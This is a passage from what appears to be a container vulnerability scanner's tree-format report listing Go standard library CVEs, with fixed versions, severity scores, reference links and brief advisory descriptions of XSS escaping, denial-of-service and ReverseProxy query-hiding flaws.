│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32289 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:e781b39a15a601dcb99c333f09e61b8c02055af4e38aec9125716d83e93cca94 
│     │      ├ Title           : html/template: golang: html/template: Cross-Site Scripting (XSS) via improper
│     │      │                   context and brace depth tracking in JS template literals 
│     │      ├ Description     : Context was not properly tracked across template branches for JS template
│     │      │                   literals, leading to possibly incorrect escaping of content when branches were
│     │      │                    used. Additionally template actions within JS template literals did not
│     │      │                   properly track the brace depth, leading to incorrect escaping being applied.
│     │      │                   These issues could cause actions within JS template literals to be incorrectly
│     │      │                    or improperly escaped, leading to XSS vulnerabilities. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 4 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32289 
│     │      │                  ├ [1]: https://go.dev/cl/763762 
│     │      │                  ├ [2]: https://go.dev/issue/78331 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32289 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4865 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32289 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.82Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:06:57.367Z 
│     ├ [14] ╭ VulnerabilityID : CVE-2026-27139 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4602 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.8, 1.26.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27139 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:124384b9ce6bbad5c448d29d887e36628933586471fe67186d619f03825dbe6c 
│     │      ├ Title           : os: FileInfo can escape from a Root in golang os module 
│     │      ├ Description     : On Unix platforms, when listing the contents of a directory using File.ReadDir
│     │      │                    or File.Readdir the returned FileInfo could reference a file outside of the
│     │      │                   Root in which the File was opened. The impact of this escape is limited to
│     │      │                   reading metadata provided by lstat from arbitrary locations on the filesystem
│     │      │                   without permitting reading or writing files outside the root. 
│     │      ├ Severity        : LOW 
│     │      ├ CweIDs           ─ [0]: CWE-22 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ azure  : 1 
│     │      │                  ├ bitnami: 1 
│     │      │                  ╰ redhat : 1 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N 
│     │      │                  │         ╰ V3Score : 2.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N 
│     │      │                            ╰ V3Score : 2.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-27139 
│     │      │                  ├ [1]: https://go.dev/cl/749480 
│     │      │                  ├ [2]: https://go.dev/issue/77827 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/EdhZqrQ98hk 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-27139 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4602 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-27139 
│     │      ├ PublishedDate   : 2026-03-06T22:16:01.07Z 
│     │      ╰ LastModifiedDate: 2026-04-21T14:32:36.317Z 
│     ├ [15] ╭ VulnerabilityID : CVE-2026-33811 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:87190fe0000fdf832d0a2e896798d479db5691a932d62a108439b9d6dac7de02 
│     │      ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
│     │      ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │      │                   can trigger a double-free of C memory and a crash. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/767860 
│     │      │                  ├ [1]: https://go.dev/issue/78803 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
│     ├ [16] ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:7fe3b522d05cea7cb9eb4309686c8766c66c13e89e04039a9739820c211ee9f6 
│     │      ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/761581 
│     │      │                  ├ [1]: https://go.dev/cl/761640 
│     │      │                  ├ [2]: https://go.dev/issue/78476 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
│     ├ [17] ╭ VulnerabilityID : CVE-2026-39820 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:9f6718c73eb058f7659ae71cbd4e61f535f2bea38efd207047c34d367a0bb78d 
│     │      ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
│     │      ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate
│     │      │                   were able to trigger excessive CPU exhaustion and memory allocations. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/759940 
│     │      │                  ├ [1]: https://go.dev/issue/78566 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
│     ├ [18] ╭ VulnerabilityID : CVE-2026-39823 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:4b1836b7d3ba73b305a28cdd1d7a060246e75c9ccbc6497d25d30a051162684a 
│     │      ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
│     │      ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │      │                   inside of a <meta> tag's <content> attribute. If the URL content were to
│     │      │                   insert ASCII whitespaces around the '=' rune inside of the <content>
│     │      │                   attribute, the escaper would fail to similarly escape it, leading to XSS. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/769920 
│     │      │                  ├ [1]: https://go.dev/issue/78913 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
│     ├ [19] ╭ VulnerabilityID : CVE-2026-39825 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:9f099e466153f8efa076ec70797afcfb648f096a0deb9a34111d65fb4a49ddb2 
│     │      ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
│     │      ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │      │                   functions. When used with a Rewrite function, or a Director function which
│     │      │                   parses query parameters, ReverseProxy sanitizes the forwarded request to
│     │      │                   remove query parameters which are not parsed by url.ParseQuery. ReverseProxy
│     │      │                   does not take ParseQuery's limit on the total number of query parameters
│     │      │                   (controlled by GODEBUG=urlmaxqueryparams=N) into account. This can permit
│     │      │                   ReverseProxy to forward a request containing a query parameter that is not
│     │      │                   visible to the Rewrite function. For example, the query
│     │      │                   "a1=x&a2=x&...&a10000=x&hidden=y" can forward the parameter "hidden=y" while
│     │      │                   hiding it from the proxy's Rewrite function. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/770541 
│     │      │                  ├ [1]: https://go.dev/issue/78948 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
│     ├ [20] ╭ VulnerabilityID : CVE-2026-39826 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:b8614a0c676b3b7d265e9a28a72e8c4292d6b8ca79df770d4564653768db564b 
│     │      ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
│     │      ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │      │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │      │                    of the template would incorrectly escape any data passed into the <script>
│     │      │                   block. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/771180 
│     │      │                  ├ [1]: https://go.dev/issue/78981 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
│     ├ [21] ╭ VulnerabilityID : CVE-2026-39836 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:f5df5a74b16848657fb5eed991e90f0dde9ec3d5510a2834e3f92f899ecdaaad 
│     │      ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
│     │      ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │      │                    containing a NUL (0). 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │      │                  ├ [1]: https://go.dev/issue/79006 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
│     ╰ [22] ╭ VulnerabilityID : CVE-2026-42499 
│            ├ VendorIDs        ─ [0]: GO-2026-4977 
│            ├ PkgID           : stdlib@v1.24.13 
│            ├ PkgName         : stdlib 
│            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│            │                  ╰ UID : ae746daa41f315ef 
│            ├ InstalledVersion: v1.24.13 
│            ├ FixedVersion    : 1.25.10, 1.26.3 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│            │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│            ├ DataSource       ╭ ID  : govulndb 
│            │                  ├ Name: The Go Vulnerability Database 
│            │                  ╰ URL : https://pkg.go.dev/vuln/ 
│            ├ Fingerprint     : sha256:7660c95fe9754dfbf348ac72d1ce7858305ed147994f2103241e69399d133acf 
│            ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
│            ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an
│            │                   email address according to RFC 5322. 
│            ├ Severity        : UNKNOWN 
│            ├ References       ╭ [0]: https://go.dev/cl/771520 
│            │                  ├ [1]: https://go.dev/issue/78987 
│            │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│            │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
│            ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│            ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
├ [4] ╭ [0] ╭ VulnerabilityID : CVE-2026-33811 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : bf537c19fc386d01 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:3132d566f01d79436ae7cf6d9109845968a7c44111f912328b6b738eaa25c95f 
│     │     ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
│     │     ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │     │                   can trigger a double-free of C memory and a crash. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/767860 
│     │     │                  ├ [1]: https://go.dev/issue/78803 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │     ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
│     ├ [1] ╭ VulnerabilityID : CVE-2026-33814 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : bf537c19fc386d01 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:5e66aa227acf3193077894cd741d29b268061bac219ae65cff5f3439e301a3dd 
│     │     ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
│     │     ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │     │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │     │                   value of 0. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/761581 
│     │     │                  ├ [1]: https://go.dev/cl/761640 
│     │     │                  ├ [2]: https://go.dev/issue/78476 
│     │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │     ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │     ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
│     ├ [2] ╭ VulnerabilityID : CVE-2026-39820 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : bf537c19fc386d01 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:b03123aeca2715936315f2039fc5b3c6d4f96643bdf7841c5ad5f41ca1ef58bd 
│     │     ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
│     │     ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate were
│     │     │                    able to trigger excessive CPU exhaustion and memory allocations. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/759940 
│     │     │                  ├ [1]: https://go.dev/issue/78566 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
│     ├ [3] ╭ VulnerabilityID : CVE-2026-39823 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : bf537c19fc386d01 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:c5a69552162407a644ea3c83ed9b66fe4bff70e9e2b76df9068c129a01e5238c 
│     │     ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
│     │     ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │     │                   inside of a <meta> tag's <content> attribute. If the URL content were to insert
│     │     │                    ASCII whitespaces around the '=' rune inside of the <content> attribute, the
│     │     │                   escaper would fail to similarly escape it, leading to XSS. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/769920 
│     │     │                  ├ [1]: https://go.dev/issue/78913 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
│     ├ [4] ╭ VulnerabilityID : CVE-2026-39825 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : bf537c19fc386d01 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:8e695931dfff71867fb547b2aa61380b136c527fc098111697113f3aa529f900 
│     │     ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
│     │     ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │     │                   functions. When used with a Rewrite function, or a Director function which
│     │     │                   parses query parameters, ReverseProxy sanitizes the forwarded request to remove
│     │     │                    query parameters which are not parsed by url.ParseQuery. ReverseProxy does not
│     │     │                    take ParseQuery's limit on the total number of query parameters (controlled by
│     │     │                    GODEBUG=urlmaxqueryparams=N) into account. This can permit ReverseProxy to
│     │     │                   forward a request containing a query parameter that is not visible to the
